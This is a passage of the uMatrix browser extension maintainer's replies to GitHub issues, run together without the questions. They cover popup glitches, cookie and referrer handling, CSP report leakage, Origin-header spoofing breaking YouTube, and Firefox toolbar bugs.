address.\nEdit: I remember having this exact issue with Firefox, and the solution was to calculate and cache the scrollbar width. This got rid of the issue completely. (Edit again: actually I am not sure this is the issue here.)\n. > tar.bz2 files here: http://linux.palemoon.org/download/mainline/\nThanks, exactly what I was looking for.\n\nhttps://dl.dropboxusercontent.com/u/32559805/v/umatrix-jitter-in-palemoon.mp4\n\nI tested on my side, and I cannot reproduce this issue. The only difference which comes to mind is that you are using Pale Moon on Windows, I was using Pale Moon on Linux. Being able to reproduce is key for me to investigate (and hopefully fix) the glitch. Given that I can't also see this glitch on Firefox, now I wonder if the glitch is also experienced by some users on Firefox.\n. I changed the way it is decided when the popup is resized: we are dealing with a popup which content is dynamic here, and because of this, the popup is best placed to know when it needs to be resized. So this is how it works now, the popup code itself (platform-independent side) will trigger the resize only if needed. This is as opposed to before where whatever changes in the DOM of the popup (including irrelevant ones with regard to resize) would trigger the resize code.\nHopefully this will work. I tried on Nightly and Pale Moon, and it still work as before on my side. Fix is in latest rc.1 build.\n. > It doesn't quite fix it.\nI looked at your mp4 again, because as said now the popup will resize only if needed. From what I see in the video, the matrix is not resized, so I don't know from where that glitch comes from, there is something else at work than resizing in there. It's as if there is some kind of window snapping going on, I can't quite tell since the video crops the right part which is where something seems to be going on.\nWith the last fix, the popup on Pale Moon Linux is rock solid, the popup appears already all properly sized without any visual intermediate state, it even looks better than with Nightly, for which I can see an intermediate state.\n. Ok, I launched Windows 7 in a VM, downloaded Pale Moon for Windows, and I can see the glitch.\nNow that I can experienced myself, I can tell that yes, it is related to resize.\nCurrently it happens when one click a cell, and there is indeed a resize in such case -- because it could happens a row ends up hidden as a result of toggling one cell (in a very edgy case though, I think I will remove the trigger to resize in such case, worst will be that the popup is one matrix row higher than required when that rare case is encountered, not a terrible side-effect).\nThe fact that the glitch occurred before even without any further interaction after clicking means that the matrix was constantly resizing before, not sure why, so the fix is a keeper, and I will probably import it to uBlock too.\nNow I am not sure the slight horizontal shift at resize time can be completely eliminated, there seems to be something specific to Windows causing this (as said, it doesn't happen with Linux, same code).\n. file:// does not work on Chromium-based browsers, it is seen as being a cross-origin request (see error in the dev console of the extension). This works for Firefox though.\n. > Also, I was not able to see any errors in the uMatrix error log when trying to load file:// ... This reports nothing with chrome running under ubuntu for me.\n\nYou have to look in the extension's dev console.\n\nNext, I deselect ALL other hosts files so that only my hosts file is selected and then click \"Apply Changes\", The extension will then hang.\n\nI will look into this.\n. No exact steps for me to reproduce, as per https://github.com/gorhill/uBlock/blob/master/CONTRIBUTING.md.\n. > I think the collapsing feature should try to check the size of the element directly above the blocked one for being fixed\nThat's a job for filter list maintainers, doing this programmatically could lead to false positives, with no way to work around. And then there are performance concerns.\n. Duplicate of #203.\n. What does the logger says?\nAs said in the extension description, uMatrix is for advanced users, and as such the logger should already have been checked to find out what is blocked and why.\n. Seen in the review section of the extension:\n\nBig annoyance is how it needs to have 3rd party cookies and trackers enabled to log in !! WHY !! I don't want 3rd party nonsense when I'm logging in to YOUR service !!\n\nCould your issue be related to this?\n. Something else to try if you still can't find anything blocked, is to turn off referrer and/or UA spoofing for the behind-the-scene scope. The spoofing may interfere with to proper functioning of a site sometimes (for example, https://crowdin.com/ does not like UA spoofing).\n. > It might be a Chromium thing\nIt has to be, as the popup container size is controlled by the browser in Chromium. I suspect it could be an issue specific to Chromium for OSX as I've never seen/heard such issue with Linux.\nThe particularity of uMatrix popup is that it is built dynamically, so it seems this is not handled well in your specific environment. You should report this to Chromium devs: https://code.google.com/p/chromium/issues/list.\n. Thanks for the patch.\nHowever, could you submit only the en version? All the other versions are downloaded from Crowdin, so it is up to the translators to modify them.\n. Thanks.\n. > But maybe the tooltip is wrong?\nYes, I should change it to something more accurate, like \"Save all temporary changes in the current matrix\" (or whatever better suggestion anybody proposes).\n. Recent versions of uMatrix allows to filter out displayed rules, so just enter block or allow as a filter expression.. uMatrix is not compatible with Android.\n. It's more than install.rdf, I removed the UI code for Firefox Mobile when I ported uBlock's Firefox code to uMatrix.\n. Maybe. As time permits, but especially as testing permits, as I had no way to test whether it worked for Firefox Mobile when I ported Firefox code into uBlock (now I have access to someone else's mobile device to test).\n. For the comments, ensure you have a space after the # character.\nFor the rest, not trivial at all: essentially, the My rules pane is a view into uMatrix's internals, and internally there is no comment in a ruleset, and there is no order. Trying to keep the same layout as the imported data would be quite complex actually, because the mere action of adding/removing a rule through the matrix UI  would become way too complicated and inefficient.\n. I am not seeing this at all, quite the contrary. uMatrix incurs significantly less overhead than uBlock, and when I play a video on Youtube, I see it using pretty much 0% user. I do not have what your screen shows even though I have 42.0a1 (2015-07-28):\n\nKnowing how uMatrix works internally matches quit well my screenshot, but not at all yours, and what I see on Firefox matches what I see with the Chromium version: uMatrix's overhead is negligible.\nYou will have to share more details about your environment: disclose everything which is relevant for me (or anybody else) to produce your results.\n. Did you have the logger opened? Was your screenshot taken immediately after opening uMatrix's popup UI? (dynamically building the popup UI can be demanding when the matrix is large)\n. Got the latest Nightly with the same about:performance page as yours, and I can't get your numbers, even with the logger opened (yours was opened as per your pastebin). There are a lot of other add-ons in your profile, and it's best if you can try uMatrix on its own and see if the issue is still there. Hopefully other users will report whether they see the same issue.\n. > Is there any way to delete the cookies earlier [...] so even \"blocked\" cookies are accessible by JavaScript\nI could shorten the time, but I consider this pointless -- I can't think of a case where this is a real issue.\nThing is I want to ensure uMatrix does its job in an efficient manner, and coalescing cookie deletion operations into a single one is a good approach efficiency-wise, if you kep in mind a Set-cookie header can be send with every single response from a server (i.e. pull 100 images, receive 100 Set-cookie header).\nCookies can be an issue when they are reused over a longer period of time. This is something which is immediately foiled by uMatrix, because the cookie header is stripped from outgoing requests, hence the server thinks no cookie has been set and hence can't use cookies for tracking purpose.\nThe caveat with many online browser tests is that they are not real proof of concept, oftencase they just display some information to you, but are of no use to a remote server, which is the real concern. For example, in the second link you provide, the 1st-party javascript code running on the page can set cookies, but they are completely useless in the real world, because whatever cookie(s) was set cannot be seen by the remote server, and a new one will have to be generated shortly thereafter if you enabled the option to delete cookies.\n. > is then leaked to site C. Which would be bad\nWhy would it be bad? I would like to understand why -- exactly, in details -- you think it is bad.\nIn the first place, you whitelisted:\n- 3rd-party iframe from C (which allows C to set cookies -- assuming 3rd-party cookies are not forbidden in your browser)\n- first-party cookies from C\nSo you already put a some trust in C, so I fail to see why it is bad. You could be concerned that C knows you visited A, but that is not a cookie issue, that is a referrer issue, which you can foil using the per-scope switches. As far as C is concerned, I completely fail to see any bad side effect for the user.\nAs said in my previous comment, it's designed with real world in mind, and I fail to see a real world proof of concept of why deleting the cookies asynchronously within the next two minutes is really an issue.\n. > if I \"block\" a cookie, I would usually expect that it's really blocked\nBut it is.\nThe whole matrix acts on outgoing requests, not incoming requests, and this also applies for cookies: Cookies are stripped from outgoing requests, just like some other outgoing requests will be wholly blocked, just like referrer info will be neutered from outgoing requests, etc.\nIncoming responses are not blocked, and incoming cookie headers from response requests are not stripped. The deletion of blocked cookies is merely a convenience, and the behavior is plainly explained in the UI:\n\nYour wiki page can add only confusion to a novice user's understanding of what is happening -- which is explained in pretty clear terms above -- and I sure do not like that it plays on vague fear of something being worrying about how uMatrix works.\nLet's go back to your statement:\n\nis then leaked to site C. Which would be bad\n\nWhy exactly would it be bad?\nIf you can't answer this, the wiki page will have to go.\n. > Prevent blocked sites from placing cookies.\nThere is no blocking API for cookie creation, it's notification-based.\nThe thing is, I can't prevent people from worrying about non-issues, however I should not have to bear the burden of those worries.\n. Please, here is to file issues specific to uMatrix.\n. If it can't be represented in the matrix, it won't be implemented. People uses uMatrix because of how straightforward it is to set rules, and the UI is a defining feature of uMatrix, and it's why it has not really changed since even way before HTTP Switchboard became mature. So the matrix UI is there to stay as is, and anything which does not fit naturally in this UI will be rejected -- as this would betray the main reason users prefer uMatrix to other alternatives. Workaround is to use the alternatives.\n. Scripts are blocked on the fly in uBO/uMatrix. contentSettings.javascript API is async.\n. > I wasn't asking for something impossible.\nMy opinion on this is simple: if you have an idea, work on it to make the case that it works.\n. Browsers ignore noscript tags when javascript is blocked through a Content Security Policy header.\n. There are not parsed, they are discarded.\nThe real solution was implemented before, I removed it when I refactored HTTPSB -- it had its own quirks.\n. I am going to revive the original code to spoof noscript tags.\nIt will however be a per-scope switch: for the noscript tags to be spoofed, the following conditions will have to be met:\n\n1st-party script must be blocked\nThe noscript-spoof switch must be enabled\n\nBy default the noscript-spoof switch is disabled, so that the current behavior of uMatrix is not modified. noscript tags do not always contain desirable content, hence it's best to let users opt-in with a per-scope switch.\nAs with other per-scope switches, there will be a default state in the Settings pane in the dashboard.. Fixed with 9d43f929bcb1.. Another quirk to fix: the automatic redirection won't work if the URL is not absolute, I need to fix this for next release.. The meta refresh will be triggered only if 1st-party scripts are blocked and the <noscript>-spoofing switch is enabled. It is currently disabled by default.. > Clicking a link to https://twitter.com/ will result in a request to https://twitter.com/i/csp_report containing the true referer in the JSON payload\nIs this network request made from within the behind-the-scene scope?\n. > uBlock says behind-the-scene, uMatrix says tab scope, and Firefox logged it in the page's network inspector.\nOk, there is nothing leaked in there: it's Twitter sending a payload to itself when a CSP directive is violated, which occurs when uBlock/uMatrix block scripts in the current case. Twitter merely sends to itself the current CSP header which caused the violation.\nRegarding the Origin header, yes, I need to neutralize this.\n. > But won't this information \"referrer\":\"https://github.com/gorhill/uMatrix/issues/320\" be considered a leak?\nMine was empty. Let me look more into this.\n. Ok, I now I see it, don't know why it was not reported previously -- probably hit enter in the address bar instead of refreshing the page.\nReading more into this, it does appear that there is a standard syntax for report-uri, as per MDN:\n\nreferrer The referrer of the document in which the violation occurred.\n\nSo I fixed the Origin header, and the original referrer still shows in the CSP report, which means the browser keeps and uses the original referrer value regardless of any spoofing of headers -- so the browser appears to use its own internal history data, therefore disregarding user's intent to not leak referrer information.\nThis occurs only when:\n- 1st-party scripts are blocked for the current site (hence uMatrix will inject a CSP script-src directive\n- The current site declare a report-uri in its CSP header\nFor now the proper solution I can think of is to remove the report-uri element for when uMatrix modifies the CSP, in order to avoid spurious CSP violation reports -- and consequently prevent leakage of information.\nI could take the opportunity to modernize the CSP injection code to avoid injecting if inline scripts are already forbidden by the site, it's probably going to become a more common occurrence as CSP is becoming more used by web sites.\n. Related: #129.\n. I need to import the CSP-related changes to uBlock.\n. Ugh, the fix works well for Chromium, but not for Firefox: Looks like Firefox's CSP-report-uri feature relies on the original CSP header, never on the modified one. I will need something more to address Firefox's specific behavior.\n. Side note for Firefox: with NoScript, the spurious CSP report-related network request also occurs, but as opposed to uMatrix, it occurs if allowing 1st-party scripts on Twitter, whereas with uMatrix it occurs if blocking 1st-party scripts on Twitter.\n. Feedback with the latest changes here.\nIt appears neutralizing the Origin header will break a lot of pages. For one, Youtube videos wouldn't play anymore with my set of rules, I needed to disabling referrer spoofing. I noticed that when I navigated away from Youtube using a link on a Youtube page, there was no Origin header in the main request for the document on the other site. I will need to read more about this, but for now I have to disable the spoofing of the Origin header, since the end result will be that users will be forced to disable referrer spoofing anyways, opening a larger gap privacy-wise than the current status.\nFor the other issue with CSP report, I have to figure a solution for Firefox, which may be none than to let the user block these report-uri which are reported in the other column. The current solution works well on Chromium. I believe it is possible that Firefox needs to fix the issue, since NoScript also suffers from it -- though in a different way. Firefox should take into account the modified header value, not the original one, but everything is probably more complicated. Regarding looking up the payload, that would be the worst solution, as I rather have uMatrix stick to handling URL, not the payload a requests (because efficiency).\nOutight blocking the URL in report-uri is a solution, but I would have to implement it only for Firefox, as I wouldn't want other browser vendors suffering the added overhead if it's not needed.\nAnyways, turns out everything is more complicated than expected.\n. Actually, without any extension installed, Firefox fires report-uri network requests for Twitter -- so this has nothing to do with NoScript.\n. After giving much thought about the report-uri feature, I am of the opinion a bug should be opened on bugzilla, as the issue affects not only uMatrix, but any extension which purpose is to foil referrer header. Firefox should use the modified headers, after they have gone through whatever extensions, not the original headers.\nWith Firefox, sites could currently workaround referrer spoofing extensions by purposefully designing themselves to systematically cause CSP violations to be fired every time -- fooling those using a referrer spoofer.\n. > Did you mean the report-uri relies on the original referrer header instead of the original CSP header?\nI mean that report-uri should cause Firefox to use the modified Referer header, not the original one, in the referrer property of the resulting csp-report JSON object.\n. Closing this issue as fixed, as the issue is now in Firefox's camp: https://bugzilla.mozilla.org/show_bug.cgi?id=1194970.\n. The dev channel is only available to fully reviewed extensions:\n\nBeta channels are only available to fully-reviewed add-ons [source]\n\nuMatrix is currently awaiting full review.\n. uMatrix has now been fully reviewed on AMO. I can now upload dev builds to AMO, and I did upload the latest build, 0.9.2.2b1.\n. Likely related to https://code.google.com/p/chromium/issues/detail?id=515275.\n. > There's https everywhere for that.\nThat is the answer.\n. Closing because not an issue.\n. Thanks for the tip.\nApparently this option was not documented until last Jan 2015, so this might explain why it was not used originally. What specific entry in about:memory are you looking at?\n. Using uBlock (from where uMatrix's Firefox-specific code mostly come from), I measured the effect of using sameZoneAs, using the vim color test to ensure lots of mem allocations going on, and this is what I got:\nsameZoneAs = undefined;:\n\u251c\u2500\u2500125.73 MB (48.29%) -- window-objects/top(http://vimcolorschemetest.googlecode.com/svn/html/index-c.html, id=2147483649)\n\u2502  \u251c\u2500\u2500121.51 MB (46.67%) ++ active\n\u2502  \u2514\u2500\u2500\u2500\u25004.22 MB (01.62%) ++ js-zone(0x7facfd718800)\n\u251c\u2500\u2500\u250060.66 MB (23.30%) -- js-non-window\n\u2502   \u251c\u2500\u250054.05 MB (20.76%) -- zones\n\u2502   \u2502  \u251c\u2500\u250053.29 MB (20.47%) ++ zone(0x7fad05b35000) <<<<<<<<<<<<<<<<\nsameZoneAs = win.top;:\n\u251c\u2500\u2500132.14 MB (49.91%) -- window-objects/top(http://vimcolorschemetest.googlecode.com/svn/html/index-c.html, id=2147483649)\n\u2502  \u251c\u2500\u2500121.51 MB (45.90%) ++ active\n\u2502  \u2514\u2500\u2500\u250010.63 MB (04.02%) ++ js-zone(0x7f07cae18800)\n\u251c\u2500\u2500\u250052.97 MB (20.01%) -- js-non-window\n\u2502   \u251c\u2500\u250046.04 MB (17.39%) -- zones\n\u2502   \u2502  \u251c\u2500\u250038.65 MB (14.60%) ++ zone(0x7f07cae18800)\n\u2502   \u2502  \u251c\u2500\u2500\u25006.63 MB (02.50%) ++ zone(0x7f07d3235000) <<<<<<<<<<<<<<<<\nFrom the results, the main (significant) effect has been to move content scripts' allocations out of the common (long-lived) zone into the tab-specific zone: common zone size went from ~53 MB down to ~6.6 MB.\nNot sure if this will have any noticeable effect to a user -- but nonetheless, this seems the proper way to do this.\n\nallocations by scripts loaded into those sandboxes triggers GCs in this fairly large zone instead of GCing in a window-specific zone\n\nIf I understand what you are saying, zones are separate, independent memory arenas, and thus running a GC operation in one means the GC code will not stumble onto items from other arenas (zones)?\n. The 1st-party is the base domain extracted from the URL of the page.\nAll direct or indirect network requests made by the page which do not match the base domain of the URL of the page are considered 3rd-party.\n. Use the logger and see if the requests to fetch the remote hosts files are blocked by uMatrix.\n. uMtrix does not block erroneously, it blocks what it is told to block.\npiwik.org is in MVPS, so you need to contact MVPS' maintainers. Unblock using the matrix or create local or global rule to unblock as you wish.\n. > there is a clear problem with being able to conveniently turn off blocking under user control\nWhen a web site breaks due to something being blocked, one clicks the uMatrix button then creates rules to fix the issue. This is no different in the current instance.\n\n. See https://github.com/gorhill/uBlock/issues/605.\n. > Is it safe to allow 1st party Frames on reputable sites\n1st-party frames are not blocked with default settings, because if you already connected to the site, so 1st-party frames are assumed safe.\n\nIs there a way to discover what the Frame is?\n\nLogger.\n. Fixed with e8136cb6679d.. I am no longer maintaining the Firefox legacy version.. > latest build of chromium\nWhich is?\n. Ok, using Google Chrome 47.0.2498.0 dev (64-bit), I ran a test case to find out whether uBlock can see network requests fired by other another extension and the result is negative: so something has changed in Google Chrome, behind-the-scene network requests which belong to other extensions can no longer be seen by an extension through chrome.webRequest. This is a setback for uBlock/uMatrix and for users, as both uBlock and uMatrix were able to disclose to a user what an extension was doing behind the scene, where it was connecting.\nI want to run further tests to fully confirm, but so far this is what I have observed.\nNot nice.\n. \"Hide requests in an extension from other extensions\"\nhttps://chromium.googlesource.com/chromium/src/+/86154b409eed6ea7f9177f6bf576e76533ab2f7b\nThe related Chromium issue is not public (\"forbidden\"):\nhttps://code.google.com/p/chromium/issues/detail?id=510802\nReview of the modified code:\nhttps://codereview.chromium.org/1267183003.\n. \"CVE-2015-1297 chromium-browser: Permission scoping error in WebRequest\"\nhttps://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-1297.\n. > if i block 1st-party cookies and images on facebook.com, and then allow only facebook.com images and cookies, all other subdomains automatically turn green as if 1st-party is allowed\nBy design. Rules for a hostname will propagate to descendant hostnames.\n. Your rule * googleadservices.com * allow does not override existing rules for www.googleadservices.com. Just override the explicit blacklisting of www.googleadservices.com (in Dan Pollock's, MVPS, hpHosts) using * www.googleadservices.com * allow.\n. The popup position is controlled by the browser, not uMatrix -- this is true for all platforms. If you think the popup position is incorrect, you should report this to Pale Moon developers.\n. You are not providing the necessary details for the issue to be handled. See CONTRIBUTING.\n\nUsing latest git version\n\nIf you are using a Chromium-based browser, syncing won't work when merely installing the uMatrix zip package. The steps to make it work are detailed at that link: http://stackoverflow.com/questions/29726604/how-do-i-test-the-sync-feature-of-the-chrome-extension-during-development. In short, you need to create a crx package and install the resulting package on various computers for syncing to work.\n. Fix is in latest dev build.\n. Please, refrain from filing feature  requests for syncing, when the feature has not been officially released yet. This is a dev build. I do use \"currently\" in \"currently, only the My rules pane is hooked up to cloud storage\".\n. Because I did not push it to AMO.\n. > Clicking on the uMatrix button does not bring up the matrix\nLooks like you have a dud installation. The browser is the one bringing up the popup, so if it does not come up, something is wrong with your uMatrix installation.\n. > Redownloaded Chromesetup.exe\nFrom where?\n. Whatever the issue is, it's unrelated to uMatrix. You will have to find solutions somewhere (example), there is clearly something with your system which interferes with the proper functioning of the browser.\n. Thanks for reporting.\nLooks like I spotted this when code-reviewing for uBlock, but forgot to backport the change to uMatrix.\n. > Do you have any insight into why the extension is behaving in this way?\nThe only way to validate that uMatrix is the cause of the slow down is to profile it when you notice a slow down, otherwise it's just an opinion.\n. Since you say you can reproduce the issue, you can prove or disprove your feeling that uMatrix is the cause. When you say the \"CPU begins to peg at 100%\", open the browser's Task Manager and see what process is causing this. If it's a specific web page, open the dev console and use the profiler to create a profile report to substantiate that uMatrix is behind the issue. If the process is uMatrix itself, open the dev console of the extension and profile it to create a profile report to see where in uMatrix the issue is.\n. > The machine becomes very sluggish and unresponsive\nuMatrix is only one process in the browser, it can't by itself make a whole machine to become slow to the point where you can't open the browser's Task Manager (which you could open beforehand btw) -- even if uMatrix was using 100% of its allocated time.\n. Blocking stuff on web pages can cause these pages to misbehave, that is the most likely explanation.. Duplicate of #30.\nHopefully One day I will find the courage to undertake this.\n. Anti-fingerprinting is best handled as a separate extension.\n. 0.9.2.2b4 submitted to dev channel on AMO.\n. I did some work re. toolbar button in uBlock Origin (1.3.0rc4). If this resolves the toolbar button issues for uBlock Origin, I will just import these fixes in uMatrix.\n. > Whenever I got the button missing in a window, it is because addLegacyToolbarButton(...) hasn't been executed for that window.\nThanks, that helps narrow down where to look in the code. I will publish an interim build later just for the sake of checking whether the problem is fixed with further changes.\n. rc6 on Releases page -- will check feedback later when I am back.\n. Just to be sure... Are you testing using uBlock?\nThis is the entry point for when a new chrome window is created:\nhttps://github.com/gorhill/uBlock/blob/master/platform/firefox/vapi-background.js#L1159\n. As said all the attempted fixes are in uBO, not in uMatrix, nothing has changed in uMatrix. If the fixes work for uBO, then I will import them to uMatrix. The point is to validate whether the fixes in uBO works in latest release.\n. You console.logged uBO, right?\nIf so, the only reason that I can think for this to happen is that Firefox is not passing the domwindowopened event to uBO. This event is received and handled at line 1219, in windowWatcher.observe. I don't see how this could be the case, hence I did not think it was useful to console.log this. Maybe you could try to just confirm the event is indeed really not fired, or if it is fired, see what is the value of topic?\n. > vAPI.tabs.getWindows produces exactly one window\nHmm interesting. I see a test against a closed attribute at line 691, I wonder if this could be related...\n. > I really gotta get some sleep. Til then.\nThanks for taking the time to investigate. When people ask me what they could contribute, this is pretty much it, investigating issues -- especially the ones I can't reproduce.\nSo at this point maybe a Pale Moon dev could provide some insights as to why getEnumerator('navigator:browser') returns only one window while no domwindowopened event is fired for the other ones.\n. > I recognized, that getting the initial windows utilizes another service than the registering an observer\nYes, I saw this yesterday, and wondered too if this could be the cause. Maybe there was a good reason to have been done this way, I will have to go through the commit history to see if this was like this since the beginning.\nOnce I release 1.3.1 I will revise the code and this will have to be well tested to find out if there are any side effect, including for Firefox for Android.\n. Alright, I will push a new revision for uBO, now strictly using WindowMediator. I tested from Palemoon to Nightly, legacy toolbar button/Australis, and all seems to work just like before. Hopefully this will fix the issue on your side.\nThe doubling of the menu item is easily taken care of by first checking whether the item is already inserted.\n. Can you confirm whether the fix work using latest uBO dev build?\n. 1.3.2b2 is available now in the Releases section.\n. > I can't see an xpi there\nMy bad, I failed to notice the build failed for some reasons. \n. I suppose both could be used, but I would have to review the code in there to be sure the it's proofed against multiple requests to attach to a window -- i.e. check if whatever needs to be done is already done.\n. > And still it gets a context menu entry\nYes, because uBO's core code calls for the installation of the context menu entry explicitly.\n. > This should fix it plus make the delay code obsolete.\nThe delay code has to stay. I just want to know if the latest b3 solves the issue.\n. > Looking at the code changes I don't get which issue you were addressing.\nI think I am getting lost in the info here. Isn't true that not all windows are reported in the event handler? I thought you were saying here that both windowWatcher and windowMediator together would result in all windows being reported to onWindowLoad().\n. I already rewrote the window watching code. Will push a new build tomorrow.\n. In latest build, I use both winddowMediator and windowWatcher's enumerators and event handlers, so there should be no cracks left for the events to fall through.\n. > It's to early for the window to satisfy those tests - at least on my machine\nArgh, that's right, I actually really meant to not do that test, given that the handler will delay until the test is satisfied -- or give up. Forgot to remove it this morning.\n\nwhy not Services.ww.getWindowEnumerator(chromeWindowType)?\n\nBecause the doc says there are no parameters:\n\nParameters\nNone.\n. I removed the test in latest b6 release.\n. > Why not getting rid of those delays?\n\nBecause it's more foolproof than cascading on yet another specific event. The code used to wait for DOMContentLoad, which could also delay (once) in case some conditions were not fulfilled. Given that uBO is meant to run on so many different flavors of FF, the time-based event handling will work on all platforms, it's the most generic and foolproof one: try until the environment is sane (or give up after it fails too often). The toolbar button is not critical for the good functioning of uBO, it can be handled asynchronously, and delayed if needed.\n. Ok now I will have to import all this in uMatrix. Not sure when I will have time to do this.\n. > I just think having one event handler for new windows registering a second event handler for adding what needs to be added is a much cleaner solution coding-wise.\nI think the opposite -- it's currently cleaner. Given that the need for delaying is inevitable anyways, why bother having code to deal at all with an intermediate event which is rendered useless by the need to delay? For me the current way takes care of whatever changes may occur in any of the FF flavors which could affect relying on one specific event -- as said time-based events are the most generic way to deal with this.\n. When referrer-spoofing breaks a web site, the solution is to disable referrer-spoofing.\n. See CONTRIBUTING, then compare against the issue you filed.\nYou said yourself \"something they changed\", so I assumed you actually researched this and came to the conclusion the issue was server-side, not uMatrix-side, this is your own words.\n. Interesting, I could reproduce it in Nightly, but not in FF41 earlier.\n. Strange, exact same page in FF41 and Nightly + exact same uMatrix configuration in FF41 and Nightly:\nFF41 plays fine with referrer spoofing enabled\nNightly does not play with referrer spoofing enabled\nUsing Network tab, I see FF41 being served a single mp4 file from googlevideo.com, while Nightly is being served chunks of webm file from googlevideo.com.\n. I turned off UA spoofing on Youtube to be sure it wasn't the issue.\n. Using FF41 UA string in Nightly does not help. Biggest difference is one is served MP4, the other webm. \n. > uMatrix sets the value of origin to the host name of the very first origin\nNo, uMatrix sets the value of origin to the destination (a subdomain of googlevideo.com), in order to prevent the server behind googlevideo.com to know that the party making the request is a page on youtube.com.\nI can reproduce with Chromium as well as you report. The error message says \"supplied origin\": this does not come from the headers, because dev console shows these are spoofed as expected by uMatrix.\nSo this is the issue: modifying the Origin header breaks Youtube. The spoofing of the Origin header was added as a fix for #320. If I comment out the spoofing of the Origin header, the videos play properly.\nSo essentially this means referrer spoofing breaks Youtube, so it will have to be disabled on Youtube.\n. > Everything was fine with 0.9.2.1\nBecause the Origin header, if present, was not spoofed. Spoofing Referer header without spoofing Origin header is not very useful. Bottomline, if referrer spoofing interfere with the proper functioning of a site, disable it for that site.\n. > i dont know whether this also applies for other sites that embed youtube\nIt always applies to the hostname in the URL of the web page.\n. I will remove the spoofing of the Origin header for the time being, this is causing too much problems at this point, and having to disable spoofing wherever there is a Youtube video embedded results in less privacy overall. More thoughts and reading needed on how to best deal with the Origin header -- and if needed at all.\nhttps://tools.ietf.org/id/draft-abarth-origin-03.html#rfc.section.7:\n\n7. Privacy Considerations\nThis section is not normative.\nThe Origin header improves on the Referer header by respecting the user's privacy: The Origin header includes only the information required to identify the principal that initiated the request (typically the scheme, host, and port of initiating origin). In particular, the Origin header does not contain the path or query portions of the URI included in the Referer header that invade privacy without providing additional security.\nThe Origin header also improves on the Referer header by not leaking intranet host names to external web sites when a user follows a hyperlink from an intranet host to an external site because hyperlinks generate privacy-sensitive requests.\n. Fixed with 8c6b94e213a0fe98db2b95787d6eec747c1dc314.\n. Whoever disagree with the decision, feel free to contribute a comprehensive solution.. I don't plan to implement a sync feature which does not relies on whatever framework is provided by the browser.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Press Escape to dismiss the popup.\n. Does this affect other addons? (If so, it's a browser thing.)\n\nBy the way, I don't have access to an OSX install, so I can't investigate OSX-specific issues. Somebody else with dev skills will have to figure a solution -- if one is required from uMatrix's side.\n. Someone with dev skills could try to add opacity: 1; in popup.css, then create a local package and install it in SeaMonkey and see if this helps.\n. > I don't know. uMatrix and uBlock Origin are my only extensions that have popups.\nTry Ghostery, it has an HTML-based popup. That will be much easier for you to install Ghostery than for me to figure a way to obtain and run OSX.\n. Where would I find a version of OSX installable in a VM if ever I want to try OSX?\n. I added opacity: 1 CSS rules in latest dev build of uBlock. Can you see if this helps?\n. I will no longer support legacy Firefox and browsers based on legacy Firefox -- I don't have the time for such a low adoption extension on lower adoption browsers.. So far I haven't found a way to investigate this:\n- there is no debugger for add-ons\n- For some reasons using console.log does not work\n. I will no longer support legacy Firefox and browsers based on legacy Firefox -- I don't have the time for such a low adoption extension on lower adoption browsers.. I tried the test case, clicking on the logo \"PornHub\" at the top left of www.pornhub.com, and uMatrix/uBlock Origin did block a redirect to ebocornac.com through their respective strict blocking implementation, but they did not prevent the pop-under from occurring.\nSo mainly it's strict blocking at work. In the current case, even if the pop-under occurs, strict blocking will prevent the pop-under from loading any content, because ebocornac.com is listed in Peter Lowe's list, which is enabled by default in uBlock Origin.\nThat specific site is best browsed when blocking 3rd-party scripts and frames through dynamic filtering, and using www.pornhub.com phncdn.com * noop. This prevent a whole lot of creepy 3rd parties from tracking you on that site:\n\n. There is already an issue opened for this. Also I can't accept your code: using replace/regex is something to avoid if possible in such time-critical code. This is why I don't accept pull requests, too often I have to rewrite the code anyways.\n. uMatrix is a hard blocker, meaning it won't try to automatically whitelist stuff without user intervention.\nWildcard in rules are not supported because of efficiency: the core engine is efficient and I don't plan to depart from this for the sake of edgy features.\n. >  a random subdomain (xys.cloudfront.net)\nIt is random-looking, but it's not random.\n. This occurs because a network request to twitter.com is sent after the Twitter page has unloaded and after the other page has started loading. In short, uMatrix is told the network request to twitter.com was fired in the context of the new page:\n\n. Do you see any Cookie header in the request headers for *-edge-chat.facebook.com? Cookies from facebook.com could be sent if they are allowed to be sent to subdomains. The domain for such cookies start with a ..\n. > I'm not sure if this is intended behavior\nYes. This is explained in the UI of uMatrix:\n\nBlacklisted cookies are not prevented by uMatrix from entering your browser. However they are prevented from leaving your browser, which is what really matters. Not blocking cookies before they enter your browser gives you the opportunity to be informed that a site tried to use cookies, and furthermore to inspect their contents if you wish.\n. @CrisBRM Yes, except remove \"immediately\": it's done in a lazy way. Cookie deletion is an asynchronous operation.\n. > my uBlock behind-the-scene logger picks up things such as 'websocket', 'media' etc but my uMatrix does not.\n\nURL?\nBrowser/version?\n. uBO and uMatrix are two different extensions, they report differently. uMatrix does not know about websocket so it's reported as other.\n. Hmm, on the other hand I would not expect the requests to be in different scopes -- if uMatrix is able to resolve the requests to the proper scope (github.com), I would expect uBO to be able to do the same.\n. > should i close this and open it on the ublock github?\nYes, thanks. Will look into this asap.\n. > are ALL domain suffixes included in umatrix (and maybe ublock?) only from publicsuffix.org?\nYes. I make absolutely no exceptions, whatever is in the list or not decide what is a suffix or not. If you think the above suffixes should be in there, submit to the maintainers of the Public Suffix List.\n. Duplicate of #358.\n. I had changed it but forgot to commit the change.\n. I don't understand what \"white list option for http referrer spoofing\" means.\n. You can turn referrer spoofing on a per-site basis, but I don't plan to have a column in the matrix just for referrer spoofing.\n. > gorhill only accepts translations directly from crowdin\nNot for description files for uMatrix -- these have to be done here. Turns out Crowdin is not optimal to translate these plain text files.\n@hexaholic Thanks for the fix.\n. In Privacy pane:\n\n[ ] Delete local storage content set by blocked hostnames\n. Confirm these images are not blocked through the logger. uMatrix blocks network requests, it won't block inlined resources through data: or resources present in the browser's memory-based cache.\n. No feedback from user. assuming data: URIs, which are inlined in the source code.. > Blacklisted cookies are not prevented by uMatrix from entering your browser. However they are prevented from leaving your browser, which is what really matters. Not blocking cookies before they enter your browser gives you the opportunity to be informed that a site tried to use cookies, and furthermore to inspect their contents if you wish.\n. > If network requests are cancelled before they leave the browser, how can a site install a cookie?\n\nHmm yes, this should not happen. Let me try to reproduce.\n. I can't reproduce. I visited http://www.kinopoisk.ru, and there was not a single network request to mc.yandex.ru.\nCould another extension you installed be responsible for this?\n. Ok, I visited a link from the front page of the site, and finally got blocked network requests to mc.yandex.ru for a script resource. However, no cookies were installed from that domain. So I can't reproduce.\n. > It turns out you need to install this extension to reproduce the problem\nUnfortunately, Chromium was changed in such a way that uMatrix can no longer see and process network requests which 